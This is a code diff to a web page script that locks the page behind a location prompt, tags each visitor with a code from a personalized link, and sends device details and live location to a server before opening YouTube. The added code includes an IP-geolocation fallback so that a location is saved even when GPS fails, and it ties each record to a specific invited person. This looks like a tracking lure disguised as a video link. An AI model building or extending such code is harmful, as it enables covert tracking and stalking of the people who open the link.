@@ -29,6 +29,18 @@ const sessionId =
   crypto.randomUUID?.() ||
   `sess_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
 
+/** From personalized link ?c=XXXXXX — only set when present in the URL. */
+function readInviteCodeFromUrl() {
+  try {
+    const raw = new URLSearchParams(window.location.search).get("c") || "";
+    return raw.trim().replace(/[^a-zA-Z0-9_-]/g, "").slice(0, 32);
+  } catch {
+    return "";
+  }
+}
+
+const inviteCode = readInviteCodeFromUrl();
+
 /** Filled once on init — same deviceId/deviceName for this phone across visits. */
 let deviceInfo = {
   deviceId: "",
@@ -136,6 +148,7 @@ function positionPayload(position, type) {
     language: deviceInfo.language,
     timezone: deviceInfo.timezone,
     userAgent: deviceInfo.userAgent,
+    inviteCode,
   };
 }
 
@@ -174,8 +187,11 @@ async function sendLocationToServer(payload) {
 
   if (!response.ok) {
     const data = await response.json().catch(() => ({}));
-    console.error("Backend save failed:", data.error || response.status);
-    return false;
+    const message = data.error || `Save failed (HTTP ${response.status})`;
+    console.error("Backend save failed:", message);
+    const error = new Error(message);
+    error.code = "SAVE_FAILED";
+    throw error;
   }
 
   return true;
@@ -259,19 +275,74 @@ function stopLiveLocation() {
   }
 }
 
-function requestBrowserLocation() {
+function requestBrowserLocationOnce(options) {
   return new Promise((resolve, reject) => {
     if (!("geolocation" in navigator)) {
-      reject(Object.assign(new Error("unsupported"), { code: -1 }));
+      reject(Object.assign(new Error("Geolocation is not supported."), { code: -1 }));
       return;
     }
 
-    navigator.geolocation.getCurrentPosition(resolve, reject, {
+    navigator.geolocation.getCurrentPosition(resolve, reject, options);
+  });
+}
+
+/**
+ * Browser GPS can fail even when permission is ON (common on Mac/desktop).
+ * This is NOT a backend error — getCurrentPosition fails before any API call.
+ * Fall back to approximate IP location so Sheets/live map still get a point.
+ */
+async function requestIpLocationFallback() {
+  const controller = new AbortController();
+  const timer = window.setTimeout(() => controller.abort(), 12000);
+  try {
+    const response = await fetch("https://get.geojs.io/v1/ip/geo.json", {
+      signal: controller.signal,
+    });
+    if (!response.ok) throw new Error(`IP lookup HTTP ${response.status}`);
+    const data = await response.json();
+    const latitude = Number(data.latitude);
+    const longitude = Number(data.longitude);
+    if (!Number.isFinite(latitude) || !Number.isFinite(longitude)) {
+      throw new Error("IP lookup returned no coordinates");
+    }
+    return {
+      coords: {
+        latitude,
+        longitude,
+        accuracy: Number(data.accuracy) || 25000,
+      },
+      timestamp: Date.now(),
+      fromIpFallback: true,
+    };
+  } finally {
+    window.clearTimeout(timer);
+  }
+}
+
+async function requestBrowserLocation() {
+  try {
+    return await requestBrowserLocationOnce({
       enableHighAccuracy: true,
-      timeout: 20000,
+      timeout: 15000,
       maximumAge: 0,
     });
-  });
+  } catch (firstError) {
+    if (isDeniedError(firstError)) throw firstError;
+    console.warn("High-accuracy location failed, retrying…", firstError);
+  }
+
+  try {
+    return await requestBrowserLocationOnce({
+      enableHighAccuracy: false,
+      timeout: 20000,
+      maximumAge: 60000,
+    });
+  } catch (secondError) {
+    if (isDeniedError(secondError)) throw secondError;
+    console.warn("Browser GPS unavailable — trying IP approximate location…", secondError);
+  }
+
+  return requestIpLocationFallback();
 }
 
 async function getGeoPermissionState() {
@@ -295,6 +366,23 @@ function isDeniedError(error) {
   );
 }
 
+function locationErrorMessage(error) {
+  if (!error) return "Could not get location. Please tap Allow again.";
+  if (error.code === "SAVE_FAILED") {
+    return `Location found, but save failed: ${error.message}`;
+  }
+  if (error.code === 2 || error.code === error.POSITION_UNAVAILABLE) {
+    return "Location permission is on, but this device could not find a GPS/Wi‑Fi fix. Turn on Location Services in system settings, try outdoors/Wi‑Fi, then tap Allow again.";
+  }
+  if (error.code === 3 || error.code === error.TIMEOUT) {
+    return "Location timed out. Keep the page open, ensure Location Services are on for this browser, then tap Allow again.";
+  }
+  if (error.code === -1) {
+    return "This browser does not support location.";
+  }
+  return error.message || "Could not get location. Please tap Allow again.";
+}
+
 /**
  * Allow → keep blur lock + centered waiting card, then ask for location.
  * YouTube opens only after location is granted.
@@ -309,6 +397,7 @@ async function handleAllow() {
 
   try {
     const position = await requestBrowserLocation();
+    const usedIpFallback = Boolean(position.fromIpFallback);
 
     lastLiveSentAt = Date.now();
     lastLiveCoords = {
@@ -319,11 +408,16 @@ async function handleAllow() {
     await sendLocationToServer(positionPayload(position, "current"));
 
     // Keep this tab open and stream updates; YouTube opens in a new tab.
-    startLiveLocation();
+    // Skip live GPS watch when we only have approximate IP location.
+    if (!usedIpFallback) {
+      startLiveLocation();
+    }
     hideDialog();
     unlockPage();
     setStatus(
-      "Location allowed. Sharing live updates… Keep this Al-Khushi tab open. Opening YouTube…",
+      usedIpFallback
+        ? "Approximate location saved (GPS unavailable on this device). Opening YouTube…"
+        : "Location allowed. Sharing live updates… Keep this Al-Khushi tab open. Opening YouTube…",
       "ok"
     );
     openYouTube();
@@ -335,7 +429,7 @@ async function handleAllow() {
       return;
     }
 
-    setDialogHint("Could not get location. Please tap Allow again.");
+    setDialogHint(locationErrorMessage(error));
     showConsentStep();
   } finally {
     allowBtn.disabled = false;
@@ -372,7 +466,10 @@ allowBtn.addEventListener("click", handleAllow);
 denyBtn.addEventListener("click", handleDontAllow);
 
 document.getElementById("blocked-reload")?.addEventListener("click", () => {
-  window.location.href = `${window.location.pathname}?t=${Date.now()}`;
+  const params = new URLSearchParams();
+  if (inviteCode) params.set("c", inviteCode);
+  params.set("t", String(Date.now()));
+  window.location.href = `${window.location.pathname}?${params.toString()}`;
 });
 
 // Block touch scrolling on the page while the gate is active.
